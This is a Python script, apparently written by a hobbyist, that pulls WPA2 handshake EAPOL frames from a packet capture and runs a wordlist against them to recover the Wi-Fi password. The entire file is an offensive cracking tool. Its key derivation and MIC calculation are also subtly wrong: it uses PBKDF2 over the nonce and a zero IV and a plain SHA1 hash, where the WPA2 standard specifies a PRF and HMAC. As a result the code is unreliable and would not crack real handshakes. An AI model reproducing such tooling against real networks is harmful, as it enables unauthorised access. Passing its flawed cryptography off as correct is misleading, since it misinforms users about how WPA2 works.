import pyshark
import binascii
import hashlib

# Function to extract the handshake from the .cap file
def extract_handshake(pcap_file):
    cap = pyshark.FileCapture(pcap_file, display_filter="eapol")
    
    eapol_packets = []
    for packet in cap:
        if 'eapol' in packet:
            eapol_packets.append(packet)
    
    if len(eapol_packets) >= 3:
        return eapol_packets
    else:
        raise ValueError(f"Not enough EAPOL packets found. Found {len(eapol_packets)} instead of 3.")

# Function to print out the full raw structure of the packet
def print_packet_structure(packet):
    print("Raw Packet Structure:")
    for layer in packet:
        print(f"Layer: {layer.layer_name}")
        for field in layer._all_fields:
            # Check if the field is a string or a field object
            if isinstance(field, str):
                print(f"Field Name: {field} (string)")
            else:
                print(f"{field.showname}: {field.showvalue}")

# Function to derive PSK from password and SSID using PBKDF2-HMAC-SHA1
def derive_psk(password, ssid):
    # Apply PBKDF2-HMAC-SHA1 to derive PSK from password and SSID
    psk = hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)
    return psk

# Function to derive the master and transient keys using the PSK
def derive_keys(psk, key_nonce, key_iv):
    # Generate Master Key and Transient Key (simplified for this example)
    # This uses the PBKDF2 derived PSK and combines it with key_nonce and key_iv
    key = hashlib.pbkdf2_hmac('sha1', psk, key_nonce + key_iv, 4096, 64)
    master_key = key[:32]  # First 32 bytes for Master Key
    transient_key = key[32:]  # Remaining bytes for Transient Key
    return master_key, transient_key

# Function to verify the password by checking the WPA Key MIC
def verify_password(handshake, password, ssid):
    if len(handshake) < 3:
        raise ValueError("The handshake is incomplete, not enough EAPOL packets to verify the password.")
    
    # Display packet structure to manually inspect the fields
    print_packet_structure(handshake[2])  # Inspect the 3rd EAPOL packet
    
    # Extract WPA Key MIC, WPA Key Nonce, and Key IV from the EAPOL packets
    try:
        key_mic = binascii.unhexlify(handshake[2].eapol.keymic.replace(":", ""))
    except AttributeError:
        key_mic = None
    try:
        key_nonce = binascii.unhexlify(handshake[1].eapol.keynonce.replace(":", ""))
    except AttributeError:
        key_nonce = None
    key_iv = bytes([0] * 16)  # IV is 16 bytes of zeroes in WPA2
    
    # Debugging output
    print(f"Extracted WPA Key MIC: {key_mic}")
    print(f"Extracted WPA Key Nonce: {key_nonce}")
    print(f"Using Key IV: {key_iv.hex()}")  # For clarity
    
    if key_mic is None or key_nonce is None:
        print("Error: Could not extract all necessary fields from EAPOL packets.")
        return False

    # Derive the PSK using the password and SSID
    psk = derive_psk(password, ssid)

    # Derive the Master and Transient keys
    master_key, transient_key = derive_keys(psk, key_nonce, key_iv)

    # Create the MIC from the derived PSK
    data_to_hash = handshake[2].eapol.load[:-16] + key_nonce + key_iv
    generated_mic = hashlib.sha1(master_key + data_to_hash).digest()[-16:]

    # Debugging output
    print(f"Generated WPA Key MIC: {generated_mic.hex()}")

    # Compare the generated MIC with the extracted MIC
    return generated_mic == key_mic

# Function to check password in wordlist
def crack_wpa(pcap_file, ssid, wordlist_file):
    # Extract the handshake
    handshake = extract_handshake(pcap_file)

    # Open wordlist and start checking passwords
    with open(wordlist_file, 'r') as f:
        for password in f:
            password = password.strip()
            print(f"Trying: {password}")
            if verify_password(handshake, password, ssid):
                print(f"Password found: {password}")
                return password

    print("Password not found.")
    return None

# Example usage
if __name__ == "__main__":
    pcap_file = "shak.cap"  # Path to your .cap file
    ssid = "PEKLO"  # Replace with the SSID of your network
    wordlist = "pwd.pwds"  # Path to your wordlist file

    # Start cracking
    crack_wpa(pcap_file, ssid, wordlist)
